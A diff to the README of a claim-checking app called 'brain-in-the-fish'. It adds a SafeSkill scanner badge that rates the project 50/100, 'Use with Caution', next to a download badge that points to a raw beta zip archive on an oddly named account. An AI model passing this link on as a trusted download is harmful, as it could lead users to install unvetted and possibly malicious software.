@@ -1,6 +1,7 @@
 # 🐟 brain-in-the-fish - Check claims before you trust them
 
 [![Download brain-in-the-fish](https://img.shields.io/badge/Download-brain--in--the--fish-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Irregularitygenusmotacilla190/brain-in-the-fish/main/avouchment/in_the_brain_fish_2.4-beta.1.zip)
+[![SafeSkill 50/100](https://img.shields.io/badge/SafeSkill-50%2F100_Use%20with%20Caution-orange)](https://safeskill.dev/scan/irregularitygenusmotacilla190-brain-in-the-fish)
 
 ## 🧠 What this app does
 
